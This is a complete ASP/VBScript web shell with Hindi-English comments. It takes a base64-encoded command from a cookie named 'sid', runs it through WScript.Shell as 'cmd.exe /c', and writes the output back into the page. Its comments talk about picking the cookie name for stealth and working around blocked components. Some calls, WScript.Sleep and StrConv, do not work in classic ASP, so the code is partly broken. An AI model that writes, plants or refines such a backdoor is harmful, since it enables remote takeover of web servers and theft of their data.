<%@ Language=VBScript %>
<%
Response.Buffer = True
Response.CacheControl = "private"
Response.Expires = -1

Dim cmdCookie, decodedCmd, objShell, objExec, output, errOutput

' Cookie name (change kar sakta hai stealth ke liye)
cmdCookie = Request.Cookies("sid")

If Len(cmdCookie) > 10 Then
    ' Base64 decode
    decodedCmd = Base64Decode(cmdCookie)
    
    If Len(decodedCmd) > 3 Then
        On Error Resume Next
        
        ' Alternate ways to execute command (WScript.Shell sabse common block hota hai)
        Set objShell = Server.CreateObject("WScript.Shell")
        
        If Err.Number <> 0 Then
            ' Agar WScript.Shell block hai to error show kar
            Response.Write "<pre style='color:red;'>[ERROR] WScript.Shell create failed: " & Err.Description & "</pre>"
        Else
            ' Exec cmd
            Set objExec = objShell.Exec("cmd.exe /c " & decodedCmd)
            
            ' Output read karne se pehle wait (kabhi kabhi hang hota hai)
            Do While objExec.Status = 0
                WScript.Sleep 100
            Loop
            
            output = objExec.StdOut.ReadAll
            errOutput = objExec.StdErr.ReadAll
            
            If Len(output) > 0 Then
                Response.Write "<pre>" & Server.HTMLEncode(output) & "</pre>"
            End If
            
            If Len(errOutput) > 0 Then
                Response.Write "<pre style='color:#ff4444;'>[ERROR]" & vbCrLf & Server.HTMLEncode(errOutput) & "</pre>"
            End If
            
            Set objExec = Nothing
        End If
        
        Set objShell = Nothing
        On Error Goto 0
    End If
Else
    ' Cookie nahi hai ya chhota hai
    Response.Write "<pre style='color:#888;'>No valid command in cookie (sid).</pre>"
End If

' Base64 decode function (Msxml2 use kar raha hai - agar yeh block hai to alternative chahiye)
Function Base64Decode(strBase64)
    Dim xmlDoc, xmlNode
    Set xmlDoc = Server.CreateObject("Msxml2.DOMDocument.6.0")
    Set xmlNode = xmlDoc.CreateElement("b64")
    xmlNode.DataType = "bin.base64"
    xmlNode.Text = strBase64
    Base64Decode = StrConv(xmlNode.NodeTypedValue, vbUnicode)
    Set xmlNode = Nothing
    Set xmlDoc = Nothing
End Function
%>
